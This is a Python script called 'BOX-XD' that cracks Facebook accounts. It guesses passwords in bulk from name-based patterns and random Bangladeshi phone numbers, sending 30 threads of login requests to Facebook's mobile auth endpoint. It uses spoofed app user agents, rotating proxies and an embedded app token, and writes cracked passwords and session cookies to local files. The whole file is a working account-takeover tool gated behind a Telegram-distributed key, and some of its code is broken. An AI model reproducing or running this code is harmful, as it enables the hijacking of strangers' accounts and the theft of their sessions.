#=============[IMPORT MODINUL]===========#
import httpx,os,time,sys
import marshal
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('git pull')
#=========[LODING ANIMATION]==========#
os.system("pip install httpx")
def ema():
	animation = ["[\x1b[1;96m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;91m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;97m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
	for i in range(20):
		time.sleep(0.1)
		sys.stdout.write(f"\r[\x1b[1;92m•\x1b[1;97m] \x1b[38;5;42mLOADING...........W1 " + animation[i % len(animation)] +"\x1b[0m ")
		sys.stdout.flush()
	os.getuid
#=============[COLOUR]==============#
R3 = '\033[0;92m'
R2 = '\33[0;41m'
R1 = '\033[1;91m'
N1 = '\033[1;94m'
G1 = '\033[1;92m'
G2 = '\x1b[38;5;46m'
G3 = '\x1b[38;5;47m'
G4 = '\x1b[38;5;48m'
G5 = '\x1b[38;5;49m'
G6 = '\x1b[38;5;50m'
G7 = '\x1b[38;5;151m'
H1 = '\033[1;93m'
W1 = '\033[97;1m'
H = '\033[1;93m'
G = '\033[1;92m'
K1 = '\033[1;95m'
#==============[DATE & TIME]============#
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
#==============[LOOP]============#
loop = 0
oks = []
cps = []
cokbrut=[]
ses=requests.Session()
uat = []
ugen2 = []
ugen = []
methods=[]
android_models=[]
user=[]
dplist = []
#=============[PROXY]==============#
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
 prox=open('.prox.txt','r').read().splitlines()
 #=============[CLEAR]==========#
 def clr():
 	os.system("clear")
 #=============[CLEAR AND LOGO]==========#
def clear():
	os.system('clear')
	print(logo)
 #=============[LINEX]===========#
def linex():
	print(f'{R1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	
#===========[LINE]============#
def line():
	print('{R1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#===========[LOCK REMOVEBEAR]==============#
def live_ck(uid):
	Box=requests.get(f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={uid}").text
	data=str(Box)
	if "live" == data.lower():
		return "LIVE"
	else:
		return "DEATH"
 #=============[USER AGENT]=============#
def hh():
	ua="[FBAN/Orca-Android;FBAV/"+str(random.randint(100,450))+'.0.0.'+str(random.randint(1,40))+'.'+str(random.randint(10,150))+';FBPN/com.facebook.orca;FBLC/en_PH;FBBV/'+str(random.randint(111111111,999999999))+";FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.6,width=720,height=1560};FB_FW/1;] FBBK/1"
	return ua
def bb():
	ua="[FBAN/Orca-Android;FBAV/"+str(random.randint(100,450))+'.0.0.'+str(random.randint(1,40))+'.'+str(random.randint(10,150))+';FBPN/com.facebook.orca;FBLC/en_PH;FBBV/'+str(random.randint(111111111,999999999))+";FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.3,width=1080,height=2340};FB_FW/1;] FBBK/1"
	return ua
def gg():
	ua="[FBAN/Orca-Android;FBAV/"+str(random.randint(100,450))+'.0.0.'+str(random.randint(1,40))+'.'+str(random.randint(10,150))+';FBPN/com.facebook.orca;FBLC/th_TH;FBBV/'+str(random.randint(111111111,999999999))+";FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1"
	return ua
def joj():
	ua="[FBAN/Orca-Android;FBAV/"+str(random.randint(100,450))+'.0.0.'+str(random.randint(1,40))+'.'+str(random.randint(10,150))+';FBPN/com.facebook.orca;FBLC/en_EG;FBBV/'+str(random.randint(111111111,999999999))+";FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]"
	return ua
def xox():
	ua="[FBAN/FB4A;FBAV/"+str(random.randint(100,450))+'.0.0.'+str(random.randint(1,40))+'.'+str(random.randint(10,150))+';FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/'+str(random.randint(111111111,999999999))+";FBCR/Viettel Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/5.1.1;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;]"
	return ua
def kk():
	ua="[FBAN/Orca-Android;FBAV/"+str(random.randint(100,450))+'.0.0.'+str(random.randint(1,40))+'.'+str(random.randint(10,150))+';FBPN/com.facebook.orca;FBLC/en_US;FBBV/'+str(random.randint(111111111,999999999))+";FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;] FBBK/1"
	return ua
def tt():
	ua="[FBAN/Orca-Android;FBAV/"+str(random.randint(100,450))+'.0.0.'+str(random.randint(1,40))+'.'+str(random.randint(10,150))+';FBPN/com.facebook.orca;FBLC/en_US;FBBV/'+str(random.randint(11111111,99999999))+";FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]"
	return ua
def alu():
	ua=f"[FBAN/Orca-Android;FBAV/"+str(random.randint(100,450))+'.0.0.'+str(random.randint(1,40))+'.'+str(random.randint(10,150))+';FBPN/com.facebook.orca;FBLC/th_TH;FBBV/'+str(random.randint(111111111,999999999))+";FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
	return ua
def bok():
	ua="[FBAN/EMA;UNITY_PACKAGE/342;FBBV/"+str(random.randint(111111111,999999999))+';FBAV/'+str(random.randint(100,450))+'.0.0.'+str(random.randint(1,40))+'.'+str(random.randint(10,150))+";FBDV/SM-J210F;FBLC/en_US;FBOP/20]"
	return ua
def si():
	ua="[FBAN/Orca-Android;FBAV/"+str(random.randint(100,450))+'.0.0.'+str(random.randint(1,40))+'.'+str(random.randint(10,150))+';FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/'+str(random.randint(11111111,99999999))+";FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
	return ua
ua = 'Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1'
def dip():
	facebook_version = f"{random.randint(100,450)}.{random.randint(0,0)}.{random.randint(0,0)}.{random.randint(1,40)}.{random.randint(10,150)}"
	fbbv = str(random.randint(10000000,66666666))
	fbrv = str(random.randint(0000000000,999999999))
	density = random.choice(['2.0'])
	width = random.choice(['1080'])
	height = random.choice(['2340'])
	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/Banglalink;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]"
	return ua
def ha():
	ua="[FBAN/Orca-Android;FBAV/"+str(random.randint(100,450))+'.0.0.'+str(random.randint(1,40))+'.'+str(random.randint(10,150))+';FBPN/com.facebook.orca;FBLC/en_US;FBBV/'+str(random.randint(111111111,999999999))+";FBCR/Verizon;FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2028};FBBK/1;FBLR/0;FB_FW/1;]"
	return ua
def us():
	ua="[FBAN/Orca-Android;FBAV/"+str(random.randint(100,450))+'.0.0.'+str(random.randint(1,40))+'.'+str(random.randint(10,150))+';FBPN/com.facebook.orca;FBLC/th_TH;FBBV/'+str(random.randint(111111111,999999999))+";FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
	return ua
#=============[MY LOGO]=============#
logo=(f"""
{R1}╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
{R1}║ {G1}██████   ██████  ██   ██       ██   ██ ██████      {R1}║ 
{R1}║ {G2}██   ██ ██    ██  ██ ██         ██ ██  ██   ██     {R1}║ 
{R1}║ {G3}██████  ██    ██   ███   █████   ███   ██   ██     {R1}║ 
{R1}║ {G4}██   ██ ██    ██  ██ ██         ██ ██  ██   ██     {R1}║ 
{R1}║ {G5}██████   ██████  ██   ██       ██   ██ ██████ {R2}V/1.0{R3}{R1}║
{R1}╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
{R1}┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳ 
{R1}║ {R1}[{H}⁂{R1}] {G1}AUTHOR    {R1}:   {G1}MD.SENAYEL ISLAM  {R1}║
{R1}║ {R1}[{H}⁂{R1}] {G2}FACEBOOK  {R1}:  {G2} SENAYEL ISLAM     {R1}║
{R1}║ {R1}[{H}⁂{R1}] {G3}GITHUB    {R1}:  {G3} LUCIFER-7D        {R1}║
{R1}║ {R1}[{H}⁂{R1}] {G4}TEAM      {R1}:  {G4} BOX-XD            {R1}║
{R1}║ {R1}[{H}⁂{R1}] {G5}VSN       {R1}:   {R2} 1.0{R3}              {R1}║
{R1}┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻ """)
#=============[MAIN]=============#
def main():
	clear()
	print(f'{R1}[{G1}A{R1}] {G1}FILE CRACK')
	print(f'{R1}[{G1}B{R1}] {G1}RANDOM CLONE')
	print(f'{R1}[{G1}C{R1}] {G1}HELP LINE')
	print(f'{R1}[{G1}D{R1}] {G1}TERMINAL EXIT')
	linex()
	t=input(f'{R1}[{G1}?{R1}] {G1}INPUT {H}: {N1}')
	if t in ["A","a","1", "01"]:
		file()
	if t in ["B","b","2","02"]:
		ramdom()
	if t in ["C","c","3", "03"]:
		help()
	elif t in [" D","d","4","04"," 0","00"]:
		os.system('exit')
	else:
		print(f"{R1}[{G1}√{R1}] {G1}TERMINAL EXIT SUCCESSFUL");time.sleep(2)
#===============[FILE SYS]============#
def file():
    global oks,cps
    clear()
    print(f'{R1}╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗')
    print(f'{R1}║ {R1}[{G1}EXAMPLE{R1}] {H}: {R1}[{N1}/SDCARD/BOX-XD.TXT{R1}] {R1}║')
    print(f'{R1}╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝') 
    dfile = input(f'{R1}[{G1}?{R1}] {G1}PUT FILE {H}: {N1}')
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{R1}[{G1}!{R1}] {G1}FILE NOT FOUND...');time.sleep(1);file()
    dplist = []
    try:
        clear()
        print(f'{R1}╔━━━━━━━━━━━━━┳━━━┳━━━┳━━━━┳━━━━━━╗')
        print(f'{R1}║ {R1}[{G1}EXAMPLE{R1}] {H}: {R1}║ {G1}7 {R1}║ {G2}9 {R1}║{G3} 10 {R1}║  {G4}15  {R1}║')
        print(f'{R1}╚━━━━━━━━━━━━━┻━━━┻━━━┻━━━━┻━━━━━━╝') 
        pass_lmit = int(input(f'{R1}[{G1}?{R1}] {G1}PASSWORD LIMITE {H}: {N1}'))
        clear()
        print(f'{R1}╔━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━╗')
        print(f'{R1}║ {R1}[{G1}EXAMPLE{R1}] {H}: {R1}║{G1}firstlast{R1}║{G2}first1122{R1}║{G3}lastfirst{R1}║{G4}last1122{R1}║')
        print(f'{R1}╚━━━━━━━━━━━━━┻━━━━━━━━━┻━━━━━━━━━┻━━━━━━━━━┻━━━━━━━━╝') 
    except:
        pass_lmit =1
    for i in range(pass_lmit):
        dplist.append(input(f'{R1}[{G1}{i+1}{R1}] {G1}PASSWORD {H}: {N1}'))
    with ThreadPool(max_workers=30) as xd:
        clear();tl = str(len(dx))
        print(f'{R1}[{H}⁂{R1}] {G1}TOTAL ACCOUNT {R1}: {G1}'+tl)
        print(f'{R1}[{H}⁂{R1}] {G2}PASSWORD LIMIT {R1}: {G2} {pass_lmit}')
        print(f'{R1}[{H}⁂{R1}] {G3}FILE POSITION {R1}: {G3}{dfile}')
        print(f'{R1}[{H}⁂{R1}] {G4}THE PROCESS HAS BEEN STARTED')
        print(f'{R1}[{H}⁂{R1}] {G5}USE FLIGHT MODE {N1}[{R1}ON{H1}/{G1}OFF{N1}] {G5} EVERY 5 MIN')
        print(f'{R1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            xd.submit(box,ids,names,passlist)
    print(f"{G1}TOTAL OK {R1}: {G1}"+str(len(oks)))
    print(f"{G1}TOTAL CP {R1}: {G1}"+str(len(cps)))
    input(f"{G1}PRESS ENTER TO BACK ")
    main()
#============[FILT CLN HEDA]=============#
def box(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r{R1}[{G1}BOX-XD{R1}] {R1}[{G4}{loop}{R1}]  {G1}OK{R1}:-{N1}{len(oks)}');sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            adid = str(uuid.uuid4())
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": ids ,
            "password": pas,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {
            'User-Agent': random.choice(get_ua_list),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data,headers=head,allow_redirects=False).json()
            if 'session_key' in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                ids=str(po['uid'])
                print(f'\r\r{R1}[{G1}SUCCESS{R1}] {G1}{ids} {R1}• {G1}{pas}')
                print("\33[0;41m[🍪] COOKIE\033[0;92m\033[1;91m : \x1b[38;5;49m"+coki) 
                linex()
                oks.append(ids)
                open('/sdcard/BOX-XD-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                break
            elif 'www.facebook.com' in po:
           	 ids=str(po['uid'])
           	 print(f'\r\r {R1}[{H1}LOCK{R1}] {H1}{ids} {R1}• {H1}{pas}')
           	 linex()
           	 open('/sdcard/BOX-XD-CP.txt','a').write(ids+'|'+pas+'\n')
           	 cps.append(ids)
           	 break
            else:
                continue
        loop+=1
    except Exception as e:
        pass
#===============[CONTRY CODE]================#
def ramdom():
	clear()
	print(f'{R1}╔━━━━━━━━━━━━━┳━━━━━┳━━━━━┳━━━━━┳━━━━━━╗')
	print(f'{R1}║ {R1}[{G1}BD CODE{R1}] {H}: {R1}║ {G1}014 {R1}║ {G2}017 {R1}║ {G3}018 {R1}║ {G4}019  {R1}║')
	print(f'{R1}╚━━━━━━━━━━━━━┻━━━━━┻━━━━━┻━━━━━┻━━━━━━╝') 
	code = input(f'{R1}[{G1}?{R1}] {G1}CODE {H}: {N1}')
	clear()
	print(f'{R1}╔━━━━━━━━━━━┳━━━━┳━━━━┳━━━━━┳━━━━━━╗')
	print(f'{R1}║ {R1}[{G1}CLONE{R1}] {H}: {R1}║{G1}1000{R1}║{G2}3000{R1}║{G3}50000{R1}║{G4}100000{R1}║')
	print(f'{R1}╚━━━━━━━━━━━┻━━━━┻━━━━┻━━━━━┻━━━━━━╝')
	limit = int(input(f' {R1}[{G1}?{R1}] {G1}LIMIT {H}: {N1}'))
	clear()
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(8))
		user.append(nmp)
	with ThreadPool(max_workers=30) as box:
		tl = str(len(user))
		print(f'{R1}[{H}⁂{R1}] {G1}SIM CODE {R1}: {G1}'+code)
		print(f'{R1}[{H}⁂{R1}] {G2}TOTAL IDS {R1}: {G2}'+tl)
		print(f'{R1}[{H}⁂{R1}] {G3}THE PROCESS HAS BEEN STARTED')
		print(f'{R1}[{H}⁂{R1}] {G4}WORK COUNTRY {R1}: {G4}BANGLADESH')
		print(f'{R1}[{H}⁂{R1}] {G5}USE FLIGHT MODE {N1}[{R1}ON{H1}/{G1}OFF{N1}] {G5} EVERY 5 MIN')
		print(f'{R1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		for xd in user:
			ids = code+xd
			pwx = [ids[5:],xd[5:],ids[:6],ids[3:],xd[3:],ids[:7],xd[:7],ids[2:],xd[2:],ids[:8],xd[:8],ids[1:],xd[1:],'bangladesh','free fire','@#@#@#','i love you']
			box.submit(graf,ids,pwx,tl)
	print(f'{G1}TOTAL OK \033[1;92m {R1} : {G1}'+str(len(oks)))
	print(f'{G1}TOTAL CP \033[1;92m {R1} : {G1}'+str(len(cps)))
	input(f'{G1}PRESS ENTER TO BACK ')
	main()
#============[RANDOM CLN HEDA]============#
def graf(ids,pwx,tl):
	global loop,oks,cps,twf
	sys.stdout.write(f'\r\r{R1}[{G1}BOX-XD{R1}] {R1}[{G4}%s{R1}║{G5}%s{R1}] {G1}OK {R1}:- {N1}%s {R1} \r'%(loop,tl,len(oks)));sys.stdout.flush()
	try:
		for pas in pwx:
			data = {
			"email":ids,
			"password":pas,
			"adid": str(uuid.uuid4()),
			"device_id": str(uuid.uuid4()),
			"family_device_id": str(uuid.uuid4()),
			"session_id": str(uuid.uuid4()),
			"advertiser_id": str(uuid.uuid4()),
			"reg_instance": str(uuid.uuid4()),
			"logged_out_id": str(uuid.uuid4()),
			"locale": "en_GB",
			"client_country_code": "GB",
			"cpl": "true",
			"source": "login",
			"format": "json",
			"omit_response_on_success": "false",
			"credentials_type": "password",
			"error_detail_type": "button_with_disabled",
			"generate_session_cookies": "1",
			"generate_analytics_claim": "1",
			"generate_machine_id": "1",
			"tier": "regular",
			"currently_logged_in_userid" : "0",
			"fb_api_req_friendly_name": "authenticate",
			"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
			"fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
			"fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
			"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
			"api_key": "882a8490361da98702bf97a021ddc14d",
			"sig":"62f8ce9f74b12f84c123cc23437a4a32"}
			content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
			head = {
			"User-Agent":hh(),
			"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
			"X-FB-SIM-HNI": str(random.randint(20000, 40000)),
			"X-FB-Net-HNI": str(random.randint(20000, 40000)),
			"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
			"X-FB-Connection-Quality": "EXCELLENT",
			"X-FB-Connection-Type": "MOBILE.LTE",
			"X-FB-HTTP-Engine": "Liger",
			'X-FB-Client-IP': 'True',
			"X-FB-Friendly-Name": "authenticate",
			"Content-Type": "application/x-www-form-urlencoded",
			"Content-Length": str(len(content_lenght))}
			url = "https://b-graph.facebook.com/auth/login"
			po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
			if 'session_key' in po:
				uid = str(po['uid'])
				coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				print(f'\r\r{R1}[{G1}SUCCESS{R1}] {G1}{uid} {R1}• {G1}{pas}')
				print('\33[0;41m[🍪] COOKIE\033[0;92m\033[1;91m : \x1b[38;5;49m'+coki)
				linex()
				open('/sdcard/BOX-XD-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
				oks.append(ids)
				break
			elif 'Please Confirm Email' in po:
				uid = str(po['uid'])
				coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				print(f'\r\r {R1}[{N1}UNVERIFIED{R1}] {N1}{uid} {R1}• {N1}{pas}')
				linex()
				open('/sdcard/BOX-XD-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['uid'])
				coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				print(f'\r\r {R1}[{H1}LOCK{R1}] {H1}{uid} {R1}• {H1}{pas}')
				linex()
				open('/sdcard/BOX-XD-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:continue
		loop+=1
	except Exception as e:
		pass
#===========[APPROVAL]=============#
def approval_menu():
    UMO="BOX-XD_"
    uuid = str(os.geteuid()) + str(os.getlogin()) 
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://raw.githubusercontent.com/LUCIFER-7D/APPROVAL.TXT/main/Approval.txt").text
    if id in DARK:
        main()
    else:
        os.system("clear")
        time.sleep(3.0)
        
        os.system("clear")
        print(logo)
        print(f"{R1}╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗")
        print (f"{R1}║ {R1}[{H1}߷{R1}] {G1}Your Key {R1}:{G1} {UMO}{id} {R1}║")
        print(f"{R1}╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝")
        print(f'  {R1}[{G1}x{R1}] {G1}FILE CRACK')
        print(f'  {R1}[{G1}x{R1}] {G1}RANDOM CLONE')
        print(f'  {R1}[{G1}x{R1}] {G1}HELP LINE')
        print(f'  {R1}[{G1}x{R1}] {G1}TERMINAL EXIT')
        linex()
        input(f"  {R1}[{G1}?{R1}] {G1}PRESS ENTER TO SEND KEY {H}: {N1}")
        os.system("xdg-open https://t.me/ANONYMOUS_07XD")
        approval_menu()   
#===========[END]=============#
approval_menu()












